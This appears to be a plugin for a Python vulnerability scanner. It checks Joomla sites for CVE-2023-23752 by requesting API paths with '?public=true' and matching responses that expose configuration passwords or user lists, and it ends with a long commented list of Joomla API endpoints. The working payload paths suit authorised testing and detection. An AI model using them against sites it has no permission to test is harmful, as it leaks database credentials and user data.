#!/usr/bin/env python3
# -*- coding:utf-8 -*-

cve_2023_23752_payloads = [
    {'path': 'api/index.php/v1/config/application?public=true'},
    {'path': 'api/index.php/v1/users?public=true'},
    {'path': 'index.php/v1/config/application?public=true'},
    {'path': 'index.php/v1/users?public=true'},
    {'path': 'v1/config/application?public=true'},
    {'path': 'v1/users?public=true'},
]

def cve_2023_23752_scan(clients):
    ''' 变量覆盖导致的越权 -> 未授权访问 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Joomla',
        'vul_type': 'unAuth',
        'vul_id': 'CVE-2023-23752',
    }
    
    for payload in cve_2023_23752_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('"type":"application"' in res.text
                and '"attributes":{"password":"' in res.text
                and '"attributes":{"user":"' in res.text)
            or (
                '"type":"users"' in res.text
                and '"attributes":{"id":' in res.text
                and '"meta":{"total-pages":' in res.text
            )
        ):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None

# * 更多API
'''
v1/banners
v1/banners/:id
v1/banners
v1/banners/:id
v1/banners/:id
v1/banners/clients
v1/banners/clients/:id
v1/banners/clients
v1/banners/clients/:id
v1/banners/clients/:id
v1/banners/categories
v1/banners/categories/:id
v1/banners/categories
v1/banners/categories/:id
v1/banners/categories/:id
v1/banners/:id/contenthistory
v1/banners/:id/contenthistory/keep
v1/banners/:id/contenthistory
v1/config/application
v1/config/application
v1/config/:component_name
v1/config/:component_name
v1/contacts/form/:id
v1/contacts
v1/contacts/:id
v1/contacts
v1/contacts/:id
v1/contacts/:id
v1/contacts/categories
v1/contacts/categories/:id
v1/contacts/categories
v1/contacts/categories/:id
v1/contacts/categories/:id
v1/fields/contacts/contact
v1/fields/contacts/contact/:id
v1/fields/contacts/contact
v1/fields/contacts/contact/:id
v1/fields/contacts/contact/:id
v1/fields/contacts/mail
v1/fields/contacts/mail/:id
v1/fields/contacts/mail
v1/fields/contacts/mail/:id
v1/fields/contacts/mail/:id
v1/fields/contacts/categories
v1/fields/contacts/categories/:id
v1/fields/contacts/categories
v1/fields/contacts/categories/:id
v1/fields/contacts/categories/:id
v1/fields/groups/contacts/contact
v1/fields/groups/contacts/contact/:id
v1/fields/groups/contacts/contact
v1/fields/groups/contacts/contact/:id
v1/fields/groups/contacts/contact/:id
v1/fields/groups/contacts/mail
v1/fields/groups/contacts/mail/:id
v1/fields/groups/contacts/mail
v1/fields/groups/contacts/mail/:id
v1/fields/groups/contacts/mail/:id
v1/fields/groups/contacts/categories
v1/fields/groups/contacts/categories/:id
v1/fields/groups/contacts/categories
v1/fields/groups/contacts/categories/:id
v1/fields/groups/contacts/categories/:id
v1/contacts/:id/contenthistory
v1/contacts/:id/contenthistory/keep
v1/contacts/:id/contenthistory
v1/content/articles
v1/content/articles/:id
v1/content/articles
v1/content/articles/:id
v1/content/articles/:id
v1/content/categories
v1/content/categories/:id
v1/content/categories
v1/content/categories/:id
v1/content/categories/:id
v1/fields/content/articles
v1/fields/content/articles/:id
v1/fields/content/articles
v1/fields/content/articles/:id
v1/fields/content/articles/:id
v1/fields/content/categories
v1/fields/content/categories/:id
v1/fields/content/categories
v1/fields/content/categories/:id
v1/fields/content/categories/:id
v1/fields/groups/content/articles
v1/fields/groups/content/articles/:id
v1/fields/groups/content/articles
v1/fields/groups/content/articles/:id
v1/fields/groups/content/articles/:id
v1/fields/groups/content/categories
v1/fields/groups/content/categories/:id
v1/fields/groups/content/categories
v1/fields/groups/content/categories/:id
v1/fields/groups/content/categories/:id
v1/content/articles/:id/contenthistory
v1/content/articles/:id/contenthistory/keep
v1/content/articles/:id/contenthistory
v1/extensions
v1/languages/content
v1/languages/content/:id
v1/languages/content
v1/languages/content/:id
v1/languages/content/:id
v1/languages/overrides/search
v1/languages/overrides/search/cache/refresh
v1/languages/overrides/site/zh-CN
v1/languages/overrides/site/zh-CN/:id
v1/languages/overrides/site/zh-CN
v1/languages/overrides/site/zh-CN/:id
v1/languages/overrides/site/zh-CN/:id
v1/languages/overrides/administrator/zh-CN
v1/languages/overrides/administrator/zh-CN/:id
v1/languages/overrides/administrator/zh-CN
v1/languages/overrides/administrator/zh-CN/:id
v1/languages/overrides/administrator/zh-CN/:id
v1/languages/overrides/site/en-GB
v1/languages/overrides/site/en-GB/:id
v1/languages/overrides/site/en-GB
v1/languages/overrides/site/en-GB/:id
v1/languages/overrides/site/en-GB/:id
v1/languages/overrides/administrator/en-GB
v1/languages/overrides/administrator/en-GB/:id
v1/languages/overrides/administrator/en-GB
v1/languages/overrides/administrator/en-GB/:id
v1/languages/overrides/administrator/en-GB/:id
v1/languages
v1/languages
v1/media/adapters
v1/media/adapters/:id
v1/media/files
v1/media/files/:path/
v1/media/files/:path
v1/media/files
v1/media/files/:path
v1/media/files/:path
v1/menus/site
v1/menus/site/:id
v1/menus/site
v1/menus/site/:id
v1/menus/site/:id
v1/menus/administrator
v1/menus/administrator/:id
v1/menus/administrator
v1/menus/administrator/:id
v1/menus/administrator/:id
v1/menus/site/items
v1/menus/site/items/:id
v1/menus/site/items
v1/menus/site/items/:id
v1/menus/site/items/:id
v1/menus/administrator/items
v1/menus/administrator/items/:id
v1/menus/administrator/items
v1/menus/administrator/items/:id
v1/menus/administrator/items/:id
v1/menus/site/items/types
v1/menus/administrator/items/types
v1/messages
v1/messages/:id
v1/messages
v1/messages/:id
v1/messages/:id
v1/modules/types/site
v1/modules/types/administrator
v1/modules/site
v1/modules/site/:id
v1/modules/site
v1/modules/site/:id
v1/modules/site/:id
v1/modules/administrator
v1/modules/administrator/:id
v1/modules/administrator
v1/modules/administrator/:id
v1/modules/administrator/:id
v1/newsfeeds/feeds
v1/newsfeeds/feeds/:id
v1/newsfeeds/feeds
v1/newsfeeds/feeds/:id
v1/newsfeeds/feeds/:id
v1/newsfeeds/categories
v1/newsfeeds/categories/:id
v1/newsfeeds/categories
v1/newsfeeds/categories/:id
v1/newsfeeds/categories/:id
v1/plugins
v1/plugins/:id
v1/plugins/:id
v1/privacy/requests
v1/privacy/requests/:id
v1/privacy/requests/export/:id
v1/privacy/requests
v1/privacy/consents
v1/privacy/consents/:id
v1/privacy/consents/:id
v1/redirects
v1/redirects/:id
v1/redirects
v1/redirects/:id
v1/redirects/:id
v1/tags
v1/tags/:id
v1/tags
v1/tags/:id
v1/tags/:id
v1/templates/styles/site
v1/templates/styles/site/:id
v1/templates/styles/site
v1/templates/styles/site/:id
v1/templates/styles/site/:id
v1/templates/styles/administrator
v1/templates/styles/administrator/:id
v1/templates/styles/administrator
v1/templates/styles/administrator/:id
v1/templates/styles/administrator/:id
v1/users
v1/users/:id
v1/users
v1/users/:id
v1/users/:id
v1/fields/users
v1/fields/users/:id
v1/fields/users
v1/fields/users/:id
v1/fields/users/:id
v1/fields/groups/users
v1/fields/groups/users/:id
v1/fields/groups/users
v1/fields/groups/users/:id
v1/fields/groups/users/:id
v1/users/groups
v1/users/groups/:id
v1/users/groups
v1/users/groups/:id
v1/users/groups/:id
v1/users/levels
v1/users/levels/:id
v1/users/levels
v1/users/levels/:id
v1/users/levels/:id
'''
